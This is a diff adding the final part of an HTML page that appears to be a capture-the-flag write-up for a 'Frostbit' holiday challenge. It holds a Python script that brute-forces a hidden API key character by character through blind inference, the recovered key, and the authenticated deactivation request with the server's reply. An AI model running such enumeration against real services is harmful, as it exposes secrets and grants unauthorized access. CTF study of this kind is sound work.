+        for char in &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_&quot;:
+            if infer_character_value(field_name, i + 1, char):
+                value += char
+                print(f&quot;[+] Found character {i+1}: {char}&quot;)
+                break
+    print(f&quot;[+] Value for field '{field_name}': {value}&quot;)
+    return value
+
+def main():
+    field_name = &quot;deactivate_api_key&quot;
+    print(f&quot;[*] Starting value enumeration for field '{field_name}'...&quot;)
+    value_length = infer_value_length(field_name)
+    value = infer_value(field_name, value_length)
+    print(&quot;[+] Enumeration complete.&quot;)
+    print(f&quot;[+] Value for '{field_name}': {value}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>After executing the script, I get the value for X-API-key:</p>
+<p><code>[+] Value for field 'deactivate_api_key': abe7a6ad-715e-4e6a-901b-c9279a964f91</code></p>
+<p>I use the value with the deactivate request API, and as expected, that puts an end to Frostbit:</p>
+<pre><code>GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true HTTP/2
+Host: api.frostbit.app
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Content-Length: 4
+X-Api-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91
+</code></pre>
+<p>Server reply:</p>
+<pre><code>HTTP/2 200 OK
+Server: nginx/1.27.1
+Date: Tue, 31 Dec 2024 23:43:30 GMT
+Content-Type: application/json
+Content-Length: 314
+Strict-Transport-Security: max-age=31536000
+
+{&quot;message&quot;:&quot;Response status code: 200, Response body: {\&quot;result\&quot;:\&quot;success\&quot;,\&quot;rid\&quot;:\&quot;917c8ddd-fc69-421e-8134-aa92c78e42f0\&quot;,\&quot;hash\&quot;:\&quot;6093849c19ae5572d7efc98151579c36bbda0ac6a76bb2adfc55c2406853d2f0\&quot;,\&quot;uid\&quot;:\&quot;36359\&quot;}\nPOSTED WIN RESULTS FOR RID 917c8ddd-fc69-421e-8134-aa92c78e42f0&quot;,&quot;status&quot;:&quot;Deactivated&quot;}
+</code></pre>
+<p><strong>Another Christmas holiday saved!</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.path"], "search": "../../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
+      
+    
+  </body>
+</html>
